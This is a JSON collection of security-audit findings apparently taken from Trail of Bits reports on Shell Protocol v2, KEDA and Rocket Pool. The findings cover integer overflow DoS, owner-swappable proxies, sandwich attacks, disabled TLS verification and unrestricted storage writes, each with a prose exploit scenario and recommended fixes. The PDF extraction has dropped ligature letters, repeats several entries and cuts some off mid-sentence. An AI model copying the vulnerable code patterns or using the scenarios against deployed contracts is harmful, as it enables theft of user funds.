[
    {
        "title": "1. Denial-of-service conditions caused by the use of more than 256 slices ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "The owner of a Proteus-based automated market maker (AMM) can update the system parameters to cause a denial of service (DoS) upon the execution of swaps, withdrawals, and deposits. The Proteus AMM engine design supports the creation of an arbitrary number of slices. Slices are used to segment an underlying bonding curve and provide variable liquidity across that curve. The owner of a Proteus contract can update the number of slices by calling the _updateSlices function at any point. When a user requests a swap, deposit, or withdrawal operation, the Proteus contract rst calls the _findSlice function (gure 1.1) to identify the slice in which it should perform the operation. The function iterates across the slices array and returns the index, i, of the slice that has the current ratio of token balances, m. function _findSlice(int128 m) internal view returns (uint8 i) { i = 0; while (i < slices.length) { if (m <= slices[i].mLeft && m > slices[i].mRight) return i; unchecked { ++i; } } // while loop terminates at i == slices.length // if we just return i here we'll get an index out of bounds. return i - 1; } Figure 1.1: The _findSlice() function in Proteus.sol#L1168-1179 However, the index, i, is dened as a uint8. If the owner sets the number of slices to at least 257 (by calling _updateSlices) and the current m is in the 257th slice, i will silently overow, and the while loop will continue until an out-of-gas (OOG) exception occurs. If a deposit, withdrawal, or swap requires the 257th slice to be accessed, the operation will fail because the _findSlice function will be unable to reach that slice. Exploit Scenario Eve creates a seemingly correct Proteus-based primitive (one with only two slices near the asymptotes of the bonding curve). Alice deposits assets worth USD 100,000 into a pool. Eve then makes a deposit of X and Y tokens that results in a token balance ratio, m, of 1. Immediately thereafter, Eve calls _updateSlices and sets the number of slices to 257, causing the 256th slice to have an m of 1.01. Because the current m resides in the 257th slice, the _findSlice function will be unable to nd that slice in any subsequent swap, deposit, or withdrawal operation. The system will enter a DoS condition in which all future transactions will fail. If Eve identies an arbitrage opportunity on another exchange, Eve will be able to call _updateSlices again, use the unlocked curve to buy the token of interest, and sell that token on the other exchange for a pure prot. Eectively, Eve will be able to steal user funds. Recommendations Short term, change the index, i, from the uint8 type to uint256; alternatively, create an upper limit for the number of slices that can be created and ensure that i will not overow when the _findSlice function searches through the slices array. Long term, consider adding a delay between a call to _updateSlices and the time at which the call takes eect on the bonding curve. This will allow users to withdraw from the system if they are unhappy with the new parameters. Additionally, consider making slices immutable after their construction; this will signicantly reduce the risk of undened behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. LiquidityPoolProxy owners can steal user funds ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "The LiquidityPoolProxy contract implements the IOceanPrimitive interface and can integrate with the Ocean contract as a primitive. The proxy contract calls into an implementation contract to perform deposit, swap, and withdrawal operations (gure 2.1). function swapOutput(uint256 inputToken, uint256 inputAmount) public view override returns (uint256 outputAmount) { (uint256 xBalance, uint256 yBalance) = _getBalances(); outputAmount = implementation.swapOutput(xBalance, yBalance, inputToken == xToken ? 0 : 1, inputAmount); } Figure 2.1: The swapOutput() function in LiquidityPoolProxy.sol#L3947 However, the owner of a LiquidityPoolProxy contract can perform the privileged operation of changing the underlying implementation contract via a call to setImplementation (gure 2.2). The owner could thus replace the underlying implementation with a malicious contract to steal user funds. function setImplementation(address _implementation) external onlyOwner { } implementation = ILiquidityPoolImplementation(_implementation); Figure 2.2: The setImplementation() function in LiquidityPoolProxy.sol#L2833 This level of privilege creates a single point of failure in the system. It increases the likelihood that a contracts owner will be targeted by an attacker and incentivizes the owner to act maliciously. Exploit Scenario Alice deploys a LiquidityPoolProxy contract as an Ocean primitive. Eve gains access to Alices machine and upgrades the implementation to a malicious contract that she controls. Bob attempts to swap USD 1 million worth of shDAI for shUSDC by calling computeOutputAmount. Eves contract returns 0 for outputAmount. As a result, the malicious primitives balance of shDAI increases by USD 1 million, but Bob does not receive any tokens in exchange for his shDAI. Recommendations Short term, document the functions and implementations that LiquidityPoolProxy contract owners can change. Additionally, split the privileges provided to the owner role across multiple roles to ensure that no one address has excessive control over the system. Long term, develop user documentation on all risks associated with the system, including those associated with privileged users and the existence of a single point of failure.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Risk of sandwich attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "The Proteus liquidity pool implementation does not use a parameter to prevent slippage. Without such a parameter, there is no guarantee that users will receive any tokens in a swap. The LiquidityPool contracts computeOutputAmount function returns an outputAmount value indicating the number of tokens a user should receive in exchange for the inputAmount. Many AMM protocols enable users to specify the minimum number of tokens that they would like to receive in a swap. This minimum number of tokens (indicated by a slippage parameter) protects users from receiving fewer tokens than expected. As shown in gure 3.1, the computeOutputAmount function signature includes a 32-byte metadata eld that would allow a user to encode a slippage parameter. function computeOutputAmount( uint256 inputToken, uint256 outputToken, uint256 inputAmount, address userAddress, bytes32 metadata ) external override onlyOcean returns (uint256 outputAmount) { Figure 3.1: The signature of the computeOutputAmount() function in LiquidityPool.sol#L192198 However, this eld is not used in swaps (gure 3.2) and thus does not provide any protection against excessive slippage. By using a bot to sandwich a users trade, an attacker could increase the slippage incurred by the user and prot o of the spread at the users expense. function computeOutputAmount( uint256 inputToken, uint256 outputToken, uint256 inputAmount, address userAddress, bytes32 metadata ) external override onlyOcean returns (uint256 outputAmount) { ComputeType action = _determineComputeType(inputToken, outputToken); [...] } else if (action == ComputeType.Swap) { // Swap action + computeOutput context => swapOutput() outputAmount = swapOutput(inputToken, inputAmount); emit Swap( inputAmount, outputAmount, metadata, userAddress, (inputToken == xToken), true ); } [...] Figure 3.2: Part of the computeOutputAmount() function in LiquidityPool.sol#L192260 Exploit Scenario Alice wishes to swap her shUSDC for shwETH. Because the computeOutputAmount functions metadata eld is not used in swaps to prevent excessive slippage, the trade can be executed at any price. As a result, when Eve sandwiches the trade with a buy and sell order, Alice sells the tokens without purchasing any, eectively giving away tokens for free. Recommendations Short term, document the fact that protocols that choose to use the Proteus AMM engine should encode a slippage parameter in the metadata eld. The use of this parameter will reduce the likelihood of sandwich attacks against protocol users. Long term, ensure that all calls to computeOutputAmount and computeInputAmount use slippage parameters when necessary, and consider relying on an oracle to ensure that the amount of slippage that users can incur in trades is appropriately limited.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "4. Project dependencies contain vulnerabilities ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "Although dependency scans did not identify a direct threat to the project under review, npm and yarn audit identied dependencies with known vulnerabilities. Due to the sensitivity of the deployment code and its environment, it is important to ensure that dependencies are not malicious. Problems with dependencies in the JavaScript community could have a signicant eect on the repository under review. The output below details these issues: CVE ID",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "5. Use of duplicate functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "The ProteusLogic and Proteus contracts both contain a function used to update the internal slices array. Although calls to these functions currently lead to identical outcomes, there is a risk that a future update could be applied to one function but not the other, which would be problematic. < function _updateSlices(int128[] memory slopes, int128[] memory rootPrices) internal { < require(slopes.length == rootPrices.length); < require(slopes.length > 1); --- > function _updateSlices(int128[] memory slopes, int128[] memory rootPrices) > internal > { > if (slopes.length != rootPrices.length) { > revert UnequalArrayLengths(); > } > if (slopes.length < 2) { > revert TooFewParameters(); > } Figure 5.1: The di between the ProteusLogic and Proteus contracts _updateSlices() functions Using duplicate functions in dierent contracts is not best practice. It increases the risk of a divergence between the contracts and could signicantly aect the system properties. Dening a function in one contract and having other contracts call that function is less risky. Exploit Scenario Alice, a developer of the Shell Protocol, is tasked with updating the ProteusLogic contract. The update requires a change to the Proteus._updateSlices function. However, Alice forgets to update the ProteusLogic._updateSlices function. Because of this omission, the functions updates to the internal slices array may produce dierent results. Recommendations Short term, select one of the two _updateSlices functions to retain in the codebase and to maintain going forward. Long term, consider consolidating the Proteus and ProteusLogic contracts into a single implementation, and avoid duplicating logic.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Certain identity curve congurations can lead to a loss of pool tokens ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "A rounding error in an integer division operation could lead to a loss of pool tokens and the dilution of liquidity provider (LP) tokens. We reimplemented certain of Cowri Labss fuzz tests and used Echidna to test the system properties specied in the Automated Testing section. The original fuzz testing used a xed amount of 100 tokens for the initial xBalance and yBalance values; after we removed that limitation, Echidna was able to break some of the invariants. The Shell Protocol team should identify the largest possible percentage decrease in pool utility or utility per shell (UPS) to better quantify the impact of a broken invariant on system behavior. In some of the breaking cases, the ratio of token balances, m, was close to the X or Y asymptote of the identity curve. This means that an attacker might be able to disturb the balance of the pool (through ash minting or a large swap, for example) and then exploit the broken invariants. Exploit Scenario Alice withdraws USD 100 worth of token X from a Proteus-based liquidity pool by burning her LP tokens. She eventually decides to reenter the pool and to provide the same amount of liquidity. Even though the curves conguration is similar to the conguration at the time of her withdrawal, her deposit leads to only a USD 90 increase in the pools balance of token X; thus, Alice receives fewer LP tokens than she should in return, eectively losing money because of an arithmetic error. Recommendations Short term, investigate the root cause of the failing properties. Document and test the expected rounding direction (up or down) of each arithmetic operation, and ensure that the rounding direction used in each operation benets the pool. Long term, implement the fuzz testing recommendations outlined in appendix C.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "7. Lack of events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "Two critical operations do not trigger events. As a result, it will be dicult to review the correct behavior of the contracts once they have been deployed. The LiquidityPoolProxy contracts setImplementation function is called to set the implementation address of the liquidity pool and does not emit an event providing conrmation of that operation to the contracts caller (gure 7.1). function setImplementation(address _implementation) external onlyOwner { } implementation = ILiquidityPoolImplementation(_implementation); Figure 7.1: The setImplementation() function in LiquidityPoolProxy.sol#L2833 Calls to the updateSlices function in the Proteus contract do not trigger events either (gure 7.2). This is problematic because updates to the slices array have a signicant eect on the conguration of the identity curve (TOB-SHELL-1). function updateSlices(int128[] memory slopes, int128[] memory rootPrices) external onlyOwner { } _updateSlices(slopes, rootPrices); Figure 7.2: The updateSlices() function in Proteus.sol#L623628 Without events, users and blockchain-monitoring systems cannot easily detect suspicious behavior. Exploit Scenario Eve, an attacker, is able to take ownership of the LiquidityPoolProxy contract. She then sets a new implementation address. Alice, a Shell Protocol team member, is unaware of the change and does not raise a security incident. Recommendations Short term, add events for all critical operations that result in state changes. Events aid in contract monitoring and the detection of suspicious behavior. Long term, consider using a blockchain-monitoring system to track any suspicious behavior in the contracts. The system relies on several contracts to behave as expected. A monitoring mechanism for critical events would quickly detect any compromised system components.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "8. Ocean may accept unexpected airdrops ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ShellProtocolv2.pdf",
        "description": "Unexpected transfers of tokens to the Ocean contract may break its internal accounting, essentially leading to the loss of the transferred asset. To mitigate this risk, Ocean attempts to reject airdrops. Per the ERC721 and ERC1155 standards, contracts must implement specic methods to accept or deny token transfers. To do this, the Ocean contract uses the onERC721Received and onERC1155Received callbacks and _ERC1155InteractionStatus and _ERC721InteractionStatus storage ags. These storage ags are enabled in ERC721 and ERC1155 wrapping operations to facilitate successful standard-compliant transfers. However, the _erc721Unwrap and _erc1155Unwrap functions also enable the _ERC721InteractionStatus and _ERC1155InteractionStatus ags, respectively. Enabling these ags allows for airdrops, since the Ocean contract, not the user, is the recipient of the tokens in unwrapping operations. function _erc721Unwrap( address tokenAddress, uint256 tokenId, address userAddress, uint256 oceanId ) private { _ERC721InteractionStatus = INTERACTION; IERC721(tokenAddress).safeTransferFrom( address(this), userAddress, tokenId ); _ERC721InteractionStatus = NOT_INTERACTION; emit Erc721Unwrap(tokenAddress, tokenId, userAddress, oceanId); } Figure 8.1: The _erc721Unwrap() function in Ocean.sol#L1020- Exploit Scenario Alice calls the _erc721Unwrap function. When the onERC721Received callback function in Alices contract is called, Alice mistakenly sends the ERC721 tokens back to the Ocean contract. As a result, her ERC721 is permanently locked in the contract and eectively burned. Recommendations Short term, disallow airdrops of standard-compliant tokens during unwrapping interactions and document the edge cases in which the Ocean contract will be unable to stop token airdrops. Long term, when the Ocean contract is expecting a specic airdrop, consider storing the originating address of the transfer and the token type alongside the relevant interaction ag.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Use of fmt.Sprintf to build host:port string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "Several scalers use a construct like fmt.Sprintf(\"%s:%s\", host, port) to create a host:port address string from a user-supplied host and port. This approach is problematic when the host is a literal IPv6 address, which should be enclosed in square brackets when the address is part of a resource identier. An address created using simple string concatenation, such as with fmt.Sprintf , may fail to parse when given to Go standard library functions. The following source les incorrectly use fmt.Sprintf to create an address:  pkg/scalers/cassandra_scaler.go:115  pkg/scalers/mongo_scaler.go:191  pkg/scalers/mssql_scaler.go:220  pkg/scalers/mysql_scaler.go:149  pkg/scalers/predictkube_scaler.go:128  pkg/scalers/redis_scaler.go:296  pkg/scalers/redis_scaler.go:364 Recommendations Short term, use net.JoinHostPort instead of fmt.Sprintf to construct network addresses. The documentation for the net package states the following: JoinHostPort combines host and port into a network address of the form host:port . If host contains a colon, as found in literal IPv6 addresses, then JoinHostPort returns [host]:port . Long term, use Semgrep and the sprintf-host-port rule of semgrep-go to detect future instances of this issue. 2. MongoDB scaler does not encode username and password in connection string Severity: Low Diculty: Low Type: Data Validation Finding ID: TOB-KEDA-2 Target: pkg/scalers/mongo_scaler.go",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. Prometheus metrics server does not support TLS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "The KEDA Metrics Adapter exposes Prometheus metrics on an HTTP server listening on port 9022. Though Prometheus supports scraping metrics over TLS-enabled connections, KEDA does not oer TLS for this server. The function responsible for starting the HTTP server, prommetrics.NewServer , does so using the http.ListenAndServe function, which does not enable TLS. func (metricsServer PrometheusMetricServer) NewServer(address string , pattern string ) { http.HandleFunc( \"/healthz\" , func (w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) _, err := w.Write([] byte ( \"OK\" )) if err != nil { log.Fatalf( \"Unable to write to serve custom metrics: %v\" , err) } }) log.Printf( \"Starting metrics server at %v\" , address) http.Handle(pattern, promhttp.HandlerFor(registry, promhttp.HandlerOpts{})) // initialize the total error metric _, errscaler := scalerErrorsTotal.GetMetricWith(prometheus.Labels{}) if errscaler != nil { log.Fatalf( \"Unable to initialize total error metrics as : %v\" , errscaler) } log.Fatal( http.ListenAndServe(address, nil ) ) } Figure 3.1: prommetrics.NewServer exposes Prometheus metrics without TLS ( pkg/prommetrics/adapter_prommetrics.go#L82-L99 ). Exploit Scenario A user sets up KEDA with Prometheus integration, enabling the scraping of metrics on port 9022. When Prometheus makes a connection to the server, it is unencrypted, leaving both the request and response vulnerable to interception and tampering in transit. As KEDA does not support TLS for the server, the user has no way to ensure the condentiality and integrity of these metrics. Recommendations Short term, provide a ag to enable TLS for Prometheus metrics exposed by the Metrics Adapter. The usual way to enable TLS for an HTTP server is using the http.ListenAndServeTLS function.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Return value is dereferenced before error check ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "After certain calls to http.NewRequestWithContext , the *Request return value is dereferenced before the error return value is checked (see the highlighted lines in gures 4.1 and 4.2). checkTokenRequest, err := http.NewRequestWithContext(ctx, \"HEAD\" , tokenURL.String(), nil ) checkTokenRequest.Header.Set( \"X-Subject-Token\" , token) checkTokenRequest.Header.Set( \"X-Auth-Token\" , token) if err != nil { return false , err } Figure 4.1: pkg/scalers/openstack/keystone_authentication.go#L118-L124 req, err := http.NewRequestWithContext(ctx, \"GET\" , url, nil ) req.SetBasicAuth(s.metadata.username, s.metadata.password) req.Header.Set( \"Origin\" , s.metadata.corsHeader) if err != nil { return - 1 , err } Figure 4.2: pkg/scalers/artemis_scaler.go#L241-L248 If an error occurred in the call to NewRequestWithContext , this behavior could result in a panic due to a nil pointer dereference. Exploit Scenario One of the calls to http.NewRequestWithContext shown in gures 4.1 and 4.2 returns an error and a nil *Request pointer. The subsequent code dereferences the nil pointer, resulting in a panic, crash, and DoS condition for the aected KEDA scaler. Recommendations Short term, check the error return value before accessing the returned *Request (e.g., by calling methods on it). Long term, use CodeQL and its go/missing-error-check query to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. Unescaped components in PostgreSQL connection string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "The PostgreSQL scaler creates a connection string by formatting the congured host, port, username, database name, SSL mode, and password with fmt.Sprintf : meta.connection = fmt.Sprintf( \"host=%s port=%s user=%s dbname=%s sslmode=%s password=%s\" , host, port, userName, dbName, sslmode, password, ) Figure 5.1: pkg/scalers/postgresql_scaler.go#L127-L135 However, none of the parameters included in the format string are escaped before the call to fmt.Sprintf . According to the PostgreSQL documentation ,  To write an empty value, or a value containing spaces, surround it with single quotes, for example keyword = 'a value' . Single quotes and backslashes within a value must be escaped with a backslash, i.e., \\' and \\\\ . As KEDA does not perform this escaping, the connection string could fail to parse if any of the conguration parameters (e.g., the password) contains symbols with special meaning in PostgreSQL connection strings. Furthermore, this issue may allow the injection of harmful or unintended parameters into the connection string using spaces and equal signs. Although the latter attack violates assumptions about the applications behavior, it is not a severe issue in KEDAs case because users can already pass full connection strings via the connectionFromEnv conguration parameter. Exploit Scenario A user congures the PostgreSQL scaler with a password containing a space. As the PostgreSQL scaler does not escape the password in the connection string, when the client connection is initialized, the string fails to parse, an error is thrown, and the scaler does not function. Recommendations Short term, escape the user-provided PostgreSQL parameters using the method described in the PostgreSQL documentation . Long term, use the custom Semgrep rule provided in Appendix C to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Redis scalers set InsecureSkipVerify when TLS is enabled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "The Redis Lists scaler (of which most of the code is reused by the Redis Streams scaler) supports the enableTLS option to allow the connection to the Redis server to use Transport Layer Security (TLS). However, when creating the TLSConfig for the Redis client, the scaler assigns the InsecureSkipVerify eld to the value of enableTLS (Figure 6.1), which means that certicate and server name verication is always disabled when TLS is enabled. This allows trivial MitM attacks, rendering TLS ineective. if info.enableTLS { options.TLSConfig = &tls.Config{ InsecureSkipVerify: info.enableTLS, } } Figure 6.1: KEDA sets InsecureSkipVerify to the value of info.enableTLS , which is always true in the block above. This pattern occurs in three locations: pkg/scalers/redis_scaler.go#L472-L476 , pkg/scalers/redis_scaler.go#L496-L500 , and pkg/scalers/redis_scaler.go#L517-L521 . KEDA does not document this insecure behavior, and users likely expect that enableTLS is implemented securely to prevent MitM attacks. The only public mention of this behavior is a stale, closed issue concerning this problem on GitHub . Exploit Scenario A user deploys KEDA with the Redis Lists or Redis Streams scaler. To protect the condentiality and integrity of data in transit between KEDA and the Redis server, the user sets the enableTLS metadata eld to true . Unbeknownst to the user, KEDA has disabled TLS certicate verication, allowing attackers on the network to modify the data in transit. An adversary can then falsify metrics coming from Redis to maliciously inuence the scaling behavior of KEDA and the Kubernetes cluster (e.g., by causing a DoS). Recommendations Short term, add a warning to the public documentation that the enableTLS option, as currently implemented, is not secure. Short term, do not enable InsecureSkipVerify when the user species the enableTLS parameter. 7. Insu\u0000cient check against nil Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-KEDA-7 Target: pkg/scalers/azure_eventhub_scaler.go#L253-L259",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Use of fmt.Sprintf to build host:port string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "Several scalers use a construct like fmt.Sprintf(\"%s:%s\", host, port) to create a host:port address string from a user-supplied host and port. This approach is problematic when the host is a literal IPv6 address, which should be enclosed in square brackets when the address is part of a resource identier. An address created using simple string concatenation, such as with fmt.Sprintf , may fail to parse when given to Go standard library functions. The following source les incorrectly use fmt.Sprintf to create an address:  pkg/scalers/cassandra_scaler.go:115  pkg/scalers/mongo_scaler.go:191  pkg/scalers/mssql_scaler.go:220  pkg/scalers/mysql_scaler.go:149  pkg/scalers/predictkube_scaler.go:128  pkg/scalers/redis_scaler.go:296  pkg/scalers/redis_scaler.go:364 Recommendations Short term, use net.JoinHostPort instead of fmt.Sprintf to construct network addresses. The documentation for the net package states the following: JoinHostPort combines host and port into a network address of the form host:port . If host contains a colon, as found in literal IPv6 addresses, then JoinHostPort returns [host]:port . Long term, use Semgrep and the sprintf-host-port rule of semgrep-go to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. MongoDB scaler does not encode username and password in connection string ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "The MongoDB scaler creates a connection string URI by concatenating the congured host, port, username, and password: addr := fmt.Sprintf( \"%s:%s\" , meta.host, meta.port) auth := fmt.Sprintf( \"%s:%s\" , meta.username, meta.password) connStr = \"mongodb://\" + auth + \"@\" + addr + \"/\" + meta.dbName Figure 2.1: pkg/scalers/mongo_scaler.go#L191-L193 Per MongoDB documentation, if either the username or password contains a character in the set :/?#[]@ , it must be percent-encoded . However, KEDA does not do this. As a result, the constructed connection string could fail to parse. Exploit Scenario A user congures the MongoDB scaler with a password containing an  @  character, and the MongoDB scaler does not encode the password in the connection string. As a result, when the client object is initialized, the URL fails to parse, an error is thrown, and the scaler does not function. Recommendations Short term, percent-encode the user-supplied username and password before constructing the connection string. Long term, use the custom Semgrep rule provided in Appendix C to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Prometheus metrics server does not support TLS ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "The KEDA Metrics Adapter exposes Prometheus metrics on an HTTP server listening on port 9022. Though Prometheus supports scraping metrics over TLS-enabled connections, KEDA does not oer TLS for this server. The function responsible for starting the HTTP server, prommetrics.NewServer , does so using the http.ListenAndServe function, which does not enable TLS. func (metricsServer PrometheusMetricServer) NewServer(address string , pattern string ) { http.HandleFunc( \"/healthz\" , func (w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusOK) _, err := w.Write([] byte ( \"OK\" )) if err != nil { log.Fatalf( \"Unable to write to serve custom metrics: %v\" , err) } }) log.Printf( \"Starting metrics server at %v\" , address) http.Handle(pattern, promhttp.HandlerFor(registry, promhttp.HandlerOpts{})) // initialize the total error metric _, errscaler := scalerErrorsTotal.GetMetricWith(prometheus.Labels{}) if errscaler != nil { log.Fatalf( \"Unable to initialize total error metrics as : %v\" , errscaler) } log.Fatal( http.ListenAndServe(address, nil ) ) } Figure 3.1: prommetrics.NewServer exposes Prometheus metrics without TLS ( pkg/prommetrics/adapter_prommetrics.go#L82-L99 ). Exploit Scenario A user sets up KEDA with Prometheus integration, enabling the scraping of metrics on port",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Redis scalers set InsecureSkipVerify when TLS is enabled ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "The Redis Lists scaler (of which most of the code is reused by the Redis Streams scaler) supports the enableTLS option to allow the connection to the Redis server to use Transport Layer Security (TLS). However, when creating the TLSConfig for the Redis client, the scaler assigns the InsecureSkipVerify eld to the value of enableTLS (Figure 6.1), which means that certicate and server name verication is always disabled when TLS is enabled. This allows trivial MitM attacks, rendering TLS ineective. if info.enableTLS { options.TLSConfig = &tls.Config{ InsecureSkipVerify: info.enableTLS, } } Figure 6.1: KEDA sets InsecureSkipVerify to the value of info.enableTLS , which is always true in the block above. This pattern occurs in three locations: pkg/scalers/redis_scaler.go#L472-L476 , pkg/scalers/redis_scaler.go#L496-L500 , and pkg/scalers/redis_scaler.go#L517-L521 . KEDA does not document this insecure behavior, and users likely expect that enableTLS is implemented securely to prevent MitM attacks. The only public mention of this behavior is a stale, closed issue concerning this problem on GitHub . Exploit Scenario A user deploys KEDA with the Redis Lists or Redis Streams scaler. To protect the condentiality and integrity of data in transit between KEDA and the Redis server, the user sets the enableTLS metadata eld to true . Unbeknownst to the user, KEDA has disabled TLS certicate verication, allowing attackers on the network to modify the data in transit. An adversary can then falsify metrics coming from Redis to maliciously inuence the scaling behavior of KEDA and the Kubernetes cluster (e.g., by causing a DoS). Recommendations Short term, add a warning to the public documentation that the enableTLS option, as currently implemented, is not secure. Short term, do not enable InsecureSkipVerify when the user species the enableTLS parameter.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Insu\u0000cient check against nil ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "Within a function in the scaler for Azure event hubs, the object partitionInfo is dereferenced before correctly checking it against nil . Before the object is used, a check conrms that partitionInfo is not nil . However, this check is insucient because the function returns if the condition is met, and the function subsequently uses partitionInfo without additional checks against nil . As a result, a panic may occur when partitionInfo is later used in the same function. func (s *azureEventHubScaler) GetUnprocessedEventCountInPartition(ctx context.Context, partitionInfo *eventhub.HubPartitionRuntimeInformation) (newEventCount int64 , checkpoint azure.Checkpoint, err error ) { // if partitionInfo.LastEnqueuedOffset = -1, that means event hub partition is empty if partitionInfo != nil && partitionInfo.LastEnqueuedOffset == \"-1\" { return 0 , azure.Checkpoint{}, nil } checkpoint, err = azure.GetCheckpointFromBlobStorage(ctx, s.httpClient, s.metadata.eventHubInfo, partitionInfo.PartitionID ) Figure 7.1: partionInfo is dereferenced before a nil check pkg/scalers/azure_eventhub_scaler.go#L253-L259 Exploit Scenario While the Azure event hub performs its usual applications, an application error causes GetUnprocessedEventCountInPartition to be called with a nil partitionInfo parameter. This causes a panic and the scaler to crash and to stop monitoring events. Recommendations Short term, edit the code so that partitionInfo is checked against nil before dereferencing it. Long term, use CodeQL and its go/missing-error-check query to detect future instances of this issue.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Prometheus metrics server does not support authentication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-01-keda-securityreview.pdf",
        "description": "When scraping metrics, Prometheus supports multiple forms of authentication , including Basic authentication, Bearer authentication, and OAuth 2.0. KEDA exposes Prometheus metrics but does not oer the ability to protect its metrics server with any of the supported authentication types. Exploit Scenario A user deploys KEDA on a network. An adversary gains access to the network and is able to issue HTTP requests to KEDAs Prometheus metrics server. As KEDA does not support authentication for the server, the attacker can trivially view the exposed metrics. Recommendations Short term, implement one or more of the authentication types that Prometheus supports for scrape targets. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Any network contract can change any nodes withdrawal address ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/RocketPool.pdf",
        "description": "The RocketStorage contract uses the eternal storage pattern. The contract is a key-value store that all protocol contracts can write to and read. However, RocketStorage has a special protected storage area that should not be writable by network contracts (gure 1.1); it should be writable only by node operators under specic conditions. This area stores data related to node operators withdrawal addresses and is critical to the security of their assets. // Protected storage (not accessible by network contracts) mapping(address => address) private withdrawalAddresses; mapping(address => address) private pendingWithdrawalAddresses; Figure 1.1: Protected storage in the RocketStorage contract (RocketStorage.sol#L24-L26) RocketStorage also has a number of setters for types that t in to a single storage slot. These setters are implemented by the raw sstore opcode (gure 1.2) and can be used to set any storage slot to any value. They can be called by any network contract, and the caller will have full control of storage slots and values. function setUint(bytes32 _key, uint _value) onlyLatestRocketNetworkContract override external { assembly { sstore (_key, _value) } } Figure 1.2: An example of a setter that uses sstore in the RocketStorage contract (RocketStorage.sol#L205-209) As a result, all network contracts can write to all storage slots in the RocketStorage contract, including those in the protected area. There are three setters that can set any storage slot to any value under any condition: setUint, setInt, and setBytes32. The addUint setter can be used if the unsigned integer representation of the value is larger than the current value; subUint can be used if it is smaller. Other setters such as setAddress and setBool can be used to set a portion of a storage slot to a value; the rest of the storage slot is zeroed out. However, they can still be used to delete any storage slot. In addition to undermining the security of the protected storage areas, these direct storage-slot setters make the code vulnerable to accidental storage-slot clashes. The burden of ensuring security is placed on the caller, who must pass in a properly hashed key. A bug could easily lead to the overwriting of the guardian, for example. Exploit Scenario Alice, a node operator, trusts Rocket Pools guarantee that her deposit will be protected even if other parts of the protocol are compromised. Attacker Charlie upgrades a contract that has write access to RocketStorage to a malicious version. Charlie then computes the storage slot of each node operators withdrawal address, including Alices, and calls rocketStorage.setUint(slot, charliesAddress) from the malicious contract. He can then trigger withdrawals and steal node 